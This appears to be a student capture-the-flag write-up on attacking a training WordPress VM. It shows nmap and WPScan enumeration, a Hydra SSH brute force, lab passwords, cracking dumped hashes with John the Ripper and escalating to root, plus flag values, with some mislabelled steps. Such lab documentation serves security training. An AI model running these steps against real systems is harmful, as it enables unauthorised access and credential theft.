# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

command: $ nmap -sV 192.168.1.110

output:

This scan identifies the services below as potential points of entry:

- Target 1
  Port 22/TCP Open SSH
  Port 80/TCP Open HTTP
  Port 111/TCP Open rcpbid
  Port 139/TCP Open netbios-ssn
  Port 445/TCP Open netbios-ssn

 Critical Vulnerabilites
 
The following vulnerabilities were identified on each target:

-Target 1

  User Enumeration (WordPress site)
  
  Found the occurrence of simplistic usernames and weak passwords (Hydra Command)
  
  Brute forced ssh to gain access into the system.
  
  Secure files are not hidden away.
  
  Misconfiguration of User Privileges/ Privilege Escalation
 
![image](https://user-images.githubusercontent.com/105754955/182508065-ae851b13-bb59-4e94-9f55-90926879fdcf.png)

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: {b9bbcb33e11b80be759c4e844862482d}

 ![image](https://user-images.githubusercontent.com/105754955/182508105-58962ee7-ab19-44fa-9bac-793665b4831b.png)


    - **Exploit Used**
    
•	WPScan to enumerate users on the Target1 WordPress site.
•	Command: $ wpscan --url 192.168.1.110/wordpress $ wpscan --url 192.168.1.110 --enumerate -u
 
 ![image](https://user-images.githubusercontent.com/105754955/182508140-6fea1755-debe-49d2-b387-2c8ccc95b804.png)

•	Targeting the user michael

•	Small manual Brute Force attack to guess/finds Michael's password.

•	First, the user's password is weak and obvious.

•	Second, for practice, Hydra can be used to crack Michaels's password:

    o	Command: hydra -l michael -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.110 -t 4 ssh  
  
  ![image](https://user-images.githubusercontent.com/105754955/182508237-ac396c72-fc85-4197-ba75-eef3c7b3a279.png)

•	Capturing Flag1: SSH in as Michael, transvering through directories and files.

•	The first Flag was found in /var/www/html folder at root in services.html in a HTML comment below the footer.

    o	Commands:
        	ssh michael@192.168.1.110
      
        	password: michael
      
        	cd /var/www/html
      
        	ls -l
      
        	nano services.html





 - `flag2.txt`: {fc3fd5Bdcdad9ab23facac6e9a365e581c33}

 ![image](https://user-images.githubusercontent.com/105754955/182508413-c87b7790-45ea-4965-8fff-62f793892d24.png)


    - **Exploit Used**

    The same exploit used to gain flag1.
    
•	Capturing Flag2: While in SSH in as Michael, Flag2 was also gained.

    o	Once again, browsing through the files and directories, Flag2 can be found in /var/www next to the html folder where Flag1 was found.
  
    o	Commands:
  
        	ssh michael@192.168.1.110
      
        	password: michael
      
        	cd /var/www
      
        	ls 
      
        	cat flag2.txt
      
- `flag3.txt`: {afc01ab56b50591e7dccf93122770cd23}
 
![image](https://user-images.githubusercontent.com/105754955/182508573-62aa6e43-5d86-4dcc-8aac-60093bd38939.png)

Exploit Used:

•	Same exploits to gain Flag1 and Flag2.
.
•	Capturing Flag3: Access the MYSQL database.

    o	Discovering the wp-config.php and gaining access to the database credentials as the user Michael, MYSQL when used to explore the database.
    
•	Commands:

    o	mysql -u root -p 
    
    o	Enter password: R@v3nSecurity
    
    o	show databases;
    
    o	Show tables
    
    o	select * from wp_posts;
 
![image](https://user-images.githubusercontent.com/105754955/182508932-960df4e1-44c0-4e96-836a-9459fadde7f4.png)

- `flag3.txt`: {715dea6c055b9fe3337544932F2941ce}
 
![image](https://user-images.githubusercontent.com/105754955/182508953-5004395c-0d4a-43ef-ba40-7829c8b4809b.png)

Exploit Used:

•	Unsalted password hash and use of the privilege escalation with Python.

•	Capture Flag4: Gained user credentials, cracked password with John the Ripper and used Python to gain root privileges.

•	Once gaining access to the database credentials as the user Michael from the wp-config.php file, the next step was to lift the username and password hashes using MYSQL.

•	The credentials were located in the wp_users table in the wordpress database. The usernames and passwords were copied and saved on the Kali machine in a file call wp_hashes.txt.
  
  o	Commands:
  
      o	mysql -u root -p 
      
      o	Enter password: R@v3nSecurity
      
      o	show databases;

      o	Show tables

      o	select * from wp_posts;

•	On the Kali machine the wp_hashes.txt ran against John the Ripper to crack the hashes.

•	Command: - john wp_hashes.txt
 
 ![image](https://user-images.githubusercontent.com/105754955/182509074-f7db43fb-679f-414d-b73c-cf20e386a7e8.png)

•	Once the user Steven's password hash was cracked, the next step was to SSH into the server as Steven. Under the user Steven, privileges will first be checked, and escalated to root by guessing common root passwords.

  o	Commands:

      	ssh steven@192.168.1.110

      	password: pink:84

      	sudo -l

      	su root

      	password: toor

      	find /-iname flag*

      	cat /root/flag4.txt
 
![image](https://user-images.githubusercontent.com/105754955/182509149-ca1211d8-6b34-46cd-9f7c-2adb433c7ba5.png)
